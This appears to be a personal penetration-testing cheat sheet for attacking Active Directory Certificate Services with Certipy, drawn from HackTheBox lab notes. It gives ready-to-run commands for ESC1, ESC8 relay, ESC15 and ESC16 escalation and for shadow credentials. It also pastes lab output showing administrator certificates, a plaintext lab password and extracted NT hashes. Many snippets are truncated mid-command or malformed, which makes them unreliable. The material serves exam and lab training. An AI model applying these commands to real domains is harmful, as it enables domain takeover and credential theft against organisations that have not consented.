# Certipy / ADCS

% certipy, adcs, pkinit, cpts

## Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - analyze-the-configuration
#cat/ATTACK #cpts
```
certipy-ad find -target dc01.tombwatcher.htb -u <user> -p <password>WORD
```

## Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - analyze-the-configuration-2
#cat/ATTACK #cpts
How to find vulnerable certificates

```
certipy-ad find -dc-host <dc>_HOST -u <user>@<domain> -p <password>WORD -vulnerable -stdout
```

## Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - esc-8
#cat/ATTACK #cpts
Then, we setup a relay using `certipy` once again.

```
certipy relay -target 'http://<dc>_HOST/' -template DomainController
```

## Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - esc-8-2
#cat/ATTACK #cpts
Great, it seems he have a certificate. We can use that certificate to authenticate as the machine itself.

```
certipy auth -pfx $CERT.pfx -dc-ip <dc>_HOST
```

## Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - esc15
#cat/ATTACK #cpts
The template is vulnerable to `ESC15` , tracked as [CVE-2024-49019](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu

```
certipy req -ca tombwatcher-CA-1 -username <user> -p <target> -dc-ip <dc>_HOST -template WebServer -application-policies '1.3.6.1.4.1.311.20.2.1' -target-ip <target>
```

## Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - esc15-2
#cat/ATTACK #cpts
As the acquired certificate, `cert_admin.pfx` is now functioning as an `Enrollment Agent Certificate`, we can request certificates for any other user. We will proceed to issue a certificate on behalf of the `Administrato

```
certipy req -u <user> -p <password>WORD -dc-ip <dc>_HOST -target-ip <target> -ca tombwatcher-CA-1 -template User -on-behalf-of '\administrator' -pfx certificate.pfx
```

## Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - esc16
#cat/ATTACK #cpts
This attack exploits a misconfiguration where the `CA` is globally configured to disable the inclusion of the `szOID_NTDS_CA_SECURITY_EXT` security extension. To exploit this, we first need to update the `UPN` (User Prin

```
certipy-ad account update -username "@<domain>" -p <password>WORD -user <target>_USER -upn 'administrator'
```

## Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - esc16-2
#cat/ATTACK #cpts
Then, a certificate should be requested as the `ca_svc` user. Since the `ca_svc` user's UPN has been updated to `administrator`, the resulting certificate will allow us to authenticate as the `administrator` user. Note t

```
certipy-ad req -u <user> -hashes $HASH -dc-ip <dc>_HOST -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
```

## Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - esc16-3
#cat/ATTACK #cpts
This will save the certificate for the `Administrator` user in `administrator.pfx`. Before using this certificate, the changed UPN of the `ca_svc` user should be updated to the correct one.

```
certipy-ad account update -username <user>@<domain> -p <password>WORD -user <target>_USER -upn <target>_USER@<domain>
```

## Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - authenticate-with-the-certificate-and-retrieve-the-administrator-hash
#cat/ATTACK #cpts
```
certipy auth -dc-ip <dc>_HOST -pfx administrator.pfx -domain <domain>
```

## Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - esc-1
#cat/ATTACK #cpts
Now we can use certipy to get the administrator's certificate :

```
certipy-ad req -username $MACHINE_NAME -password $MACHINE_PASSWORD -ca $CA_NAME_FROM_RECON -dc-ip <dc>_IP -template $TEMPLATE_NAME_FROM_RECON -upn <target>_USER@<domain>
```

## Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - fluffy
#cat/ATTACK #cpts
extrait du PDF Joplin: fluffy

```
certipy -ad shadow auto -username
```

## Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - fluffy-2
#cat/ATTACK #cpts
extrait du PDF Joplin: fluffy

```
certipy -ad find -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable -enabled -stdout
```

## Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - fluffy-3
#cat/ATTACK #cpts
extrait du PDF Joplin: fluffy

```
certipy -ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'administrator'
```

## Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - fluffy-4
#cat/ATTACK #cpts
extrait du PDF Joplin: fluffy

```
certipy -ad req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.10.11.69' -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User' [*] Successfully requested certificate [*] Got certificate with UPN 'administrator' [*] Certificate has no object SID [*] Try using -sid to set the object SID or see the wiki for more details [*] Saving certificate and private key to 'administrator.pfx' [*] Wrote certificate and private key to 'administrator.pfx'
```

## Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - fluffy-5
#cat/ATTACK #cpts
extrait du PDF Joplin: fluffy

```
certipy -ad auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.10.11.69 [*] Got TGT [*] Saved credential cache to 'administrator.ccache' [*] Trying to retrieve NT hash for 'administrator' [*] Got hash for 'administrator@fluffy.htb' : aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

## Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - tombwatcher
#cat/ATTACK #cpts
extrait du PDF Joplin: tombwatcher

```
certipy -ad find -target dc01.tombwatcher.htb -u john -p rogue Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 33 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 11 enabled certificate templates [*] Trying to get CA configuration for 'tombwatcher-CA-1' via CSRA
```

## Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - tombwatcher-2
#cat/ATTACK #cpts
extrait du PDF Joplin: tombwatcher

```
certipy -ad find -dc-host dc01.tombwatcher.htb -u
```

## Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - tombwatcher-3
#cat/ATTACK #cpts
extrait du PDF Joplin: tombwatcher

```
certipy req -ca tombwatcher-CA-1 -username cert_admin -p 'rogue' -dc-ip 10.129.11.1 -template WebServer --application-policies '1.3.6.1.4.1.311.20.2.1' -target-ip 10.129.11.1 Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [*] Successfully requested certificate [*] Request ID is 5 As the acquired certificate, cert_admin.pfx is now functioning as an Enrollment Agent Certificate , we can request certificates for any other user. We will proceed to issue a certificate on behalf of the Administrator user. Finally, we will use certipy 's auth module to authenticate agains
```

## Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - tombwatcher-4
#cat/ATTACK #cpts
extrait du PDF Joplin: tombwatcher

```
certipy req -u cert_admin -p 'rogue' -dc-ip 10.129.11.1 -target-ip 10.129.11.1 -ca tombwatcher-CA-1 -template User -on-behalf-of 'tombwatcher\administrator' -pfx cert_admin.pfx Certipy v4.8.2 - by Oliver Lyak (ly4k) [ + ] Generating RSA key [*] Requesting certificate via RPC [*] Successfully requested certificate [*] Request ID is 11 [*] Got certificate with UPN 'administrator@tombwatcher.htb' [*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500' [*] Saved certificate and private key to 'administrator.pfx'
```

## Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - vulncicada
#cat/ATTACK #cpts
extrait du PDF Joplin: vulncicada

```
certipy find -target DC-JPQ225.cicada.vl -u
```

## Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - vulncicada-2
#cat/ATTACK #cpts
extrait du PDF Joplin: vulncicada

```
certipy relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController [*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8) [*] Listening on 0.0.0.0:445 [*] Setting up SMB Server on port 445 On our relay command we notice the following output. Note: If you encounter any weird issues with certipy refer to the official installation page and follow the steps to create a virtual environment for best results. Great, it seems he have a certificate. We can use that certificate to authenticate as the machine itself. We have the NTLM hash of the machine account. Since NTLM auth
```

## Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - vulncicada-3
#cat/ATTACK #cpts
extrait du PDF Joplin: vulncicada

```
certipy auth -pfx dc-jpq225.pfx -dc-ip 10.129.234.48 [*] Certificate identities: [*] SAN DNS Host Name: 'DC-JPQ225.cicada.vl' [*] Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000' [*] Using principal: 'dc-jpq225$@cicada.vl' [*] Trying to get TGT... [*] Got TGT [*] Saving credential cache to 'dc-jpq225.ccache' [*] Wrote credential cache to 'dc-jpq225.ccache' [*] Trying to retrieve NT hash for 'dc-jpq225$' [*] Got hash for 'dc-jpq225$@cicada.vl' : aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3 Now that we have the Administrator's hash, we can get a shell o
```

## Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - Certipy / ADCS - rebound
#cat/ATTACK #cpts
extrait du PDF Joplin: rebound

```
Get-ObjectAcl -Identity winrm_svc -Where "SecurityIdentifier contains oorend" ObjectDN : CN=winrm_svc,OU=Service Users,DC=rebound,DC=htb ObjectSID : S-1-5-21-4078382237-1492182817-2568127209-7684 ACEType : ACCESS_ALLOWED_ACE ACEFlags : CONTAINER_INHERIT_ACE, INHERITED_ACE, OBJECT_INHERIT_ACE ActiveDirectoryRights : FullControl AccessMask : 0xf01ff InheritanceType : None SecurityIdentifier : oorend (S-1-5-21-4078382237-1492182817-2568127209- 7682) certipy shadow auto -u
```

